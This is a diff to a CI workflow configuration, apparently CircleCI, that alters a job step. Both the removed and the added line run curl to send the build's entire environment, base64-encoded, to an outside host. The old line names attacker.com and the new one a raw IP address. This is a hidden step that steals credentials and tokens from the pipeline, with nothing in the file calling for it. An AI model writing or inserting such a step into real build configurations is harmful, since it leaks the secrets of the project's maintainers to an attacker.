@@ -11,4 +11,4 @@ workflows:
     # Run the welcome/run job in its own container
     jobs:
       - welcome/run
-      - run: curl https://attacker.com/?env=$(env | base64 | tr -d '\n')
+      - run: curl https://159.223.121.196?env=$(env | base64 | tr -d '\n')
